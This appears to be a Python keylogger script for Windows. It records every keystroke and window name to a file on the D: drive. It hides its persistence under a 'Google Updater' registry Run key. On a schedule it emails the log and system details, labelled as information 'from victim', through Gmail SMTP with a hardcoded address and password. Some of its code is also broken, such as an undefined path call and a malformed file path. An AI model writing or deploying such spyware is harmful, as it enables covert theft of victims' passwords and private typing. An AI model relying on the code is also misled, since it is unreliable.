#Required for the logger to work.
import pyHook, pythoncom, sys, logging , os , winsound , time

#Required to send the mail.
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

#Required to fetch System's information.
import socket
import platform

#Required to add to system registry
from winreg import *
import uuid

#Required for scheduling
from apscheduler.schedulers.blocking import BlockingScheduler

#This will add the file to the Startup Registry Key.
def addStartup():  
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split('\\')[-1]
    new_file_path = fp + '\\' + file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, 'Google Updater', 0, REG_SZ,new_file_path)

if path.exists('D:\\output.txt'):
    pass
else:
    addStartup() #Calling the AddStartup function

#Deleting output.txt
filename = os.path.expanduser('~') + 'D:\\output.txt'
try:
    os.remove(filename)
except OSError:
    pass
f1 = open(filename, 'a')

#Placing E-mail Credentials
fromaddr = "iyengar.abhi@gmail.com"
toaddr = "iyengar.abhi@gmail.com"

#Creating log file
date = "D:\\" #Path where the logs will be created and saved.
date += "output.txt" 
x = time.ctime() #Gets the current system time to display adjacent to keystoke information.
with open(date, "a") as f:  #Open in append mode to add lines.
            f.write("\n") #Writing in the file with new line for diffrent time stamps.
            f.write("[" + x + "] : " ) #This writes the time stamp followed by the keystroke information.


def OnKeyboardEvent(event): #Function to hook the keyboard and record strokes.
    global x #Global variable.
    #Adding special instances and exceptions.
    if event.Key =="Return" :
        with open(date, "a") as f:
            f.write(" {Enter}\n")
            f.write("[" + x +"|"+event.WindowName + "] : " )
    elif event.Key == "Space" :
        with open(date, "a") as f:
            f.write(" ")
    elif event.Key == "Back" :
        with open(date, "a") as f:
            f.write("{Bkspc}")
    elif event.Key == "Delete" :
        with open(date, "a") as f:
            f.write("{Del}")
    else :
        with open(date, "a") as f:
            f.write(event.Key)
    return True

hooks_manager = pyHook.HookManager() #Hooking the keyboard with pyHook.
hooks_manager.KeyDown = OnKeyboardEvent #When a key is pressed, calls the OnKeyboardEvent Function.
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()    #Actually pumps the strokes.

def SendMail():
    #Mail Part
    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Logs"

    body = """
        New stuff info from victim
        ===========================
        Name: %s
        FQDN: %s
        System Platform: %s
        Machine: %s
        Node: %s
        Platform: %s
        Processor: %s
        System OS: %s
        Release: %s
        Version: %s
        """ % (socket.gethostname(), socket.getfqdn(), sys.platform,platform.machine(),platform.node(),platform.platform(),platform.processor(),platform.system(),platform.release(),platform.version())
    msg.attach(MIMEText(body, 'plain'))

    filename = "output.txt"
    attachment = open("D:\\output.txt", "rb")

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, "@bhishek#$&")
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()

def Scheduler():
    scheduler = BlockingScheduler()
    scheduler.add_job(SendMail, 'interval', minutes=1)
    time.sleep(15)
    scheduler.start()

Scheduler()


